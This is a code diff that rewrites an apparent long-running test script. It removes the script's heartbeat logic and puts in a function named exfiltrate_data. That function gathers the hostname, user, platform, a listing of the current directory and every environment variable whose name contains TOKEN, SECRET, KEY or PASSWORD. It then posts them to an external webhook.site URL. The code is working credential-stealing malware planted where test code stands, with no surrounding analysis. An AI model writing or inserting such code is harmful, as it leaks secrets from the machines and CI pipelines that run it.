@@ -1,40 +1,28 @@
-import time
-import sys
-import requests
 import os
+import requests
 import socket
+import platform
 
-WEBHOOK_URL = "https://webhook.site/14d05b7b-71e4-4cff-ba55-22342612179a"
+ 
+WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"
 
-def send_heartbeat(status, message):
+def exfiltrate_data():
+ 
     data = {
         "hostname": socket.gethostname(),
-        "status": status,
-        "message": message,
-        "timestamp": time.time()
+        "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
+        "uid": os.getuid() if hasattr(os, 'getuid') else "unknown",
+        "platform": platform.platform(),
+ 
+        "env_vars": {k: v for k, v in os.environ.items() if any(s in k.upper() for s in ['TOKEN', 'SECRET', 'KEY', 'PASSWORD'])},
+        "file_list": os.listdir('.') if os.path.exists('.') else []
     }
+    
     try:
         requests.post(WEBHOOK_URL, json=data)
-    except:
-        pass
-
-def hold_the_line(duration_minutes=30):
-    print(f"--- STARTING LONG-RUNNING TEST ({duration_minutes} min) ---")
-    
-    send_heartbeat("started", f"Runner started for {duration_minutes} minutes.")
-    
-    end_time = time.time() + (duration_minutes * 60)
-    interval = 300 # 5 минут в секундах
-    
-    while time.time() < end_time:
-        time.sleep(interval)
-        remaining = int((end_time - time.time()) / 60)
-        print(f"Heartbeat: {remaining} minutes remaining...", flush=True)
-        send_heartbeat("running", f"Still alive. {remaining} minutes left.")
-        
-    send_heartbeat("finished", "Test completed successfully.")
-    print("Hold finished.")
+        print("Data exfiltrated successfully.")
+    except Exception as e:
+        print(f"Failed to exfiltrate: {e}")
 
 if __name__ == "__main__":
-    mins = int(sys.argv[1]) if len(sys.argv) > 1 else 30
-    hold_the_line(mins)
+    exfiltrate_data()
